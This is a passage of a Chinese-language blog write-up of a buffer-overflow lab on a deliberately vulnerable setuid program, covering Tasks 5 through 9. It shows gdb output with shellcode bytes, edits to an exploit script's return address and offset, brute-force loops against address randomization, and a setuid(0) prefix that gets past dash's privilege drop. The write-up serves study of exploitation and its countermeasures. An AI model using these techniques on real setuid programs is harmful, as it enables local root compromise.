+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109231459697.png" alt="image-20221109231459697"></p>
+<p>我将 attack.c 添加了一条 printf，输出 buffer 的地址，并且我还在 gdb 调试 stack-L3-dbg 时打印了 buffer 的地址：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./stack-L3  </span><br><span class="line">Input size: 517</span><br><span class="line">buffer address: 7fffffffd8f0                                             </span><br><span class="line">$ ./stack-L3-dbg </span><br><span class="line">Input size: 517</span><br><span class="line">buffer address: 7fffffffd8e0</span><br><span class="line">gdb-peda$ p &amp;buffer</span><br><span class="line"><span class="variable">$1</span> = (char (*)[200]) 0x7fffffffd850</span><br></pre></td></tr></table></figure>
+
+<p>可以看到地址是各不相同的，0x7fffffffd850 + 160 就是 0x7fffffffd8f0，也就是 buffer 在 stack-L3 的地址首位。其实 32 位也会出现这种情况，所以有些我以为能够运行的结果无法运行，就是因为实际运行和调试出来的地址有点区别。我一直想着不能动 stack.c 函数，其实改一下代码就会发现问题所在了，白白浪费了很多时间。</p>
+<p>就是实际运行和调试之间会有一定的地址偏移，因此我们需要调整一下我们的数据。</p>
+<h2 id="Task-6-Launching-Attack-on-64-bit-Program-Level-4"><a href="#Task-6-Launching-Attack-on-64-bit-Program-Level-4" class="headerlink" title="Task 6: Launching Attack on 64-bit Program (Level 4)"></a>Task 6: Launching Attack on 64-bit Program (Level 4)</h2><p>这里我们的缓冲区很小，存不下 shellcode，但是我们还有一个源头啊，就是 main 函数中的 str 有 shellcode，我们可以使得函数执行 main 中的 shellcode。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p $rbp</span><br><span class="line">$2 = (void *) 0x7fffffffd9c0</span><br><span class="line">gdb-peda$ p &amp;buffer</span><br><span class="line">$3 = (char (*)[10]) 0x7fffffffd9b6</span><br><span class="line">gdb-peda$ p str</span><br><span class="line">$4 = 0x7fffffffdd50 &quot;H1\322RH\270/bin//shPH\211\347RWH\211\346H1\300\260;\017\005&quot;, &#x27;\220&#x27; &lt;repeats 170 times&gt;...</span><br><span class="line">gdb-peda$ p &amp;str</span><br><span class="line">$5 = (char **) 0x7fffffffd9a8</span><br></pre></td></tr></table></figure>
+
+<p>然后按照这个思路修改 <code>exploit.py</code> 如下:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)    <span class="comment"># 放最后面，容错率高一点</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x7fffffffdd50</span> + <span class="number">270</span>   <span class="comment"># 270 为适当的偏移</span></span><br><span class="line">offset = <span class="number">18</span>    <span class="comment"># Change this number </span></span><br></pre></td></tr></table></figure>
+
+<p>这样就可以了，这个适当偏移很有玄学的概念，我们可以使用一个脚本来穷举：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ret = <span class="number">0x7fffffffdd80</span> + <span class="built_in">int</span>(sys.argv[<span class="number">1</span>]) <span class="comment"># &amp;input 的地址并适当偏移</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(sys.argv[<span class="number">1</span>]))</span><br><span class="line">offset = <span class="number">18</span>    <span class="comment"># Change this number</span></span><br></pre></td></tr></table></figure>
+
+<p>脚本如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">value=-200</span><br><span class="line"></span><br><span class="line">while true; do</span><br><span class="line">  value=$(( $value + 10 ))</span><br><span class="line">  ./exploit.py $value</span><br><span class="line">  ./stack-L4</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p>结果还是比较奇妙的（不懂为什么 200 可以，中间的一些数又不可以，然后后面又可以）：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/2022-11-13_16-23.png" alt="img"></p>
+<h2 id="Tasks-7-Defeating-dash’s-Countermeasure"><a href="#Tasks-7-Defeating-dash’s-Countermeasure" class="headerlink" title="Tasks 7: Defeating dash’s Countermeasure"></a>Tasks 7: Defeating dash’s Countermeasure</h2><p>在 ubuntu 中， dash shell 检测到有效的 UID 和真实 UID 不相等就会放弃特权。前面我们将 sh 链接到 zsh 来解决的这个问题，现在我们来尝试新的对策。首先链接回原来的：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ln -sf /bin/dash /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>在调用 execve() 之前将真实 ID 修改为 0 即可，也就是调用 setuid(0)。我们把 call_shellcode.c 中注释掉的二进制代码加入到 shellcode 的开头就行了。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221107232111827.png" alt="image-20221107232111827"></p>
+<p>重复 Level1，可以看到，在 sh 链接到 dash 的情况下我们拿到了 root 权限：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221107232616406.png" alt="image-20221107232616406"></p>
+<h2 id="Task-8-Defeating-Address-Randomization"><a href="#Task-8-Defeating-Address-Randomization" class="headerlink" title="Task 8: Defeating Address Randomization"></a>Task 8: Defeating Address Randomization</h2><p>在 32 位系统下，栈只有 19 位熵，我们可以穷举破解它，首先，打开地址随机化：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /sbin/sysctl -w kernel.randomize_va_space=2</span><br></pre></td></tr></table></figure>
+
+<p>然后编写一个脚本，不断的执行攻击，然后就是碰运气了：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">SECONDS=0</span><br><span class="line">value=0</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">  value=$(( <span class="variable">$value</span> + <span class="number">1</span> ))</span><br><span class="line">  duration=<span class="variable">$SECONDS</span></span><br><span class="line">  min=$((<span class="variable">$duration</span> / <span class="number">60</span>))</span><br><span class="line">  sec=$((<span class="variable">$duration</span> % <span class="number">60</span>))</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$min</span> minutes and <span class="variable">$sec</span> seconds elapsed.&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;The program has been running <span class="variable">$value</span> times so far.&quot;</span></span><br><span class="line">  ./stack-L1</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Tasks-9-Experimenting-with-Other-Countermeasures"><a href="#Tasks-9-Experimenting-with-Other-Countermeasures" class="headerlink" title="Tasks 9: Experimenting with Other Countermeasures"></a>Tasks 9: Experimenting with Other Countermeasures</h2><p><code>Turn on the StackGuard Protection</code> 和  <code>Turn on the Non-executable Stack Protection</code>，打开这两个之后，攻击肯定是成功不了的。</p>
+<ul>
+<li>栈保护机制（StackGuard Protection），<code>gcc</code> 编译器实现的安全机制，阻止缓冲区溢出漏洞。你可以关闭这种机制，通过在编译时使用 <code>-fno-stack-protector</code> 选项。</li>
+<li>栈不可执行（Non-Executable Stack），<code>ubuntu</code> 默认栈不可执行，可以通过在编译的时候使用 <code>-z execstack</code> 选项来使堆栈可执行。</li>
+</ul>
+<p>在只需要在栈上执行我们的数据的情况下，可以不用关闭 <code>StackGuard Protection</code>，比如 <code>call_shellcode.c</code> 在编译的时候就没有 <code>-fno-stack-protector</code> ，因为不需要溢出。但是栈上可执行都是要的吧。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-Familiar-with-Shellcode"><span class="toc-number">2.</span> <span class="toc-text">Getting Familiar with Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-Invoking-the-Shellcode"><span class="toc-number">3.</span> <span class="toc-text">Task: Invoking the Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Understanding-the-Vulnerable-Program"><span class="toc-number">4.</span> <span class="toc-text">Task 2: Understanding the Vulnerable Program</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Launching-Attack-on-32-bit-Program-Level-1"><span class="toc-number">5.</span> <span class="toc-text">Launching Attack on 32-bit Program (Level 1)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-Launching-Attack-without-Knowing-Buffer-Size-Level-2"><span class="toc-number">6.</span> <span class="toc-text">Task 4: Launching Attack without Knowing Buffer Size (Level 2)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-5-Launching-Attack-on-64-bit-Program-Level-3"><span class="toc-number">7.</span> <span class="toc-text">Task 5: Launching Attack on 64-bit Program (Level 3)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-6-Launching-Attack-on-64-bit-Program-Level-4"><span class="toc-number">8.</span> <span class="toc-text">Task 6: Launching Attack on 64-bit Program (Level 4)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tasks-7-Defeating-dash%E2%80%99s-Countermeasure"><span class="toc-number">9.</span> <span class="toc-text">Tasks 7: Defeating dash’s Countermeasure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-8-Defeating-Address-Randomization"><span class="toc-number">10.</span> <span class="toc-text">Task 8: Defeating Address Randomization</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tasks-9-Experimenting-with-Other-Countermeasures"><span class="toc-number">11.</span> <span class="toc-text">Tasks 9: Experimenting with Other Countermeasures</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/245267c1.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/245267c1.html&text=Buffer-Overflow-Attack-Lab(Set-UID-Version)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/245267c1.html&title=Buffer-Overflow-Attack-Lab(Set-UID-Version)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/245267c1.html&is_video=false&description=Buffer-Overflow-Attack-Lab(Set-UID-Version)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Buffer-Overflow-Attack-Lab(Set-UID-Version)&body=Check out this article: https://ceyewan.github.io/p/245267c1.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/245267c1.html&title=Buffer-Overflow-Attack-Lab(Set-UID-Version)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/245267c1.html&title=Buffer-Overflow-Attack-Lab(Set-UID-Version)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/245267c1.html&title=Buffer-Overflow-Attack-Lab(Set-UID-Version)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/245267c1.html&title=Buffer-Overflow-Attack-Lab(Set-UID-Version)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/245267c1.html&name=Buffer-Overflow-Attack-Lab(Set-UID-Version)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/245267c1.html&t=Buffer-Overflow-Attack-Lab(Set-UID-Version)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+      
+        
+          2016-2024
+  </div>
+  <div class="footer-left">
+    ceyewan
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
